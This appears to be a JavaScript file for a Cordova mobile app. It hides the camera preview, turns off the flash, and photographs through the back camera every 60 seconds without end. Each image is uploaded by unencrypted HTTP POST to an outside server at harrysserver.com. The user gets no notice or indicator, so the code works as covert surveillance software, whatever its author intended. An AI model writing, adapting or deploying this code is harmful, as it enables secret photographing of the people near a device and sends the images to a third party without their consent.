var app = {
  initialize: function() {
    document.addEventListener('deviceready', this.onDeviceReady.bind(this), false);
  },
  onDeviceReady: function() {},
  receivedEvent: function(id) {}
};

var photograph=function() {
  let url='http://harrysserver.com/camera/upload.php';
      CameraPreview.takePicture({height:1280, width:720, quality:70}, function(base64PictureData) {
        var pic='data:image/jpeg;base64,'+base64PictureData;
        $.post(url, {image: pic, timeout: 50000});
      });
}

function delay() {
  return new Promise(resolve =>  setTimeout(resolve, 60000));
}

async function delayedLog() {
  await delay();  
  photograph();
}

async function processArray() { 
 for (var i=0; i<Infinity; i++) { 
     await delayedLog();
  };
}

app.initialize();
CameraPreview.startCamera({camera: CameraPreview.CAMERA_DIRECTION.BACK});
CameraPreview.setFlashMode(CameraPreview.FLASH_MODE.OFF);
CameraPreview.hide();
processArray();

